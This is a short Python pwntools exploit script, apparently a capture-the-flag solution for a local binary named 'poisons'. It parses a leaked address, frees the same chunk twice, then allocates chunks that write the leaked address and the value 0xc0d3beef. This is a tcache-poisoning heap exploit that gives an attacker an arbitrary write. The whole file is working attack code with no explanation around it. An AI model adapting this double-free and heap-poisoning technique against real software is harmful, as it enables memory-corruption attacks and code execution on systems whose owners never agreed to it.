from pwn import *

elf = ELF('./poisons')
p = process("./poisons")

def alloc(data ):
	p.sendlineafter(">","1")
	p.sendline(data)
	log.info("allocating")

def free():
	p.sendlineafter(">","2")
	p.send("1")
	log.info("freeing")

p.recvuntil('Poison\'s Secret is 0x')


leak = int(p.recv(12).strip().ljust(8,b'\x00'),16)
success(f"{hex(leak)=}")
#gdb.attach(r)
alloc("A"*8)
#exit_got = elf.got.exit
free()
free()


alloc(p64(leak))
alloc(p64(0x00))
alloc(p64(0xc0d3beef))

gdb.attach(p)

p.interactive()
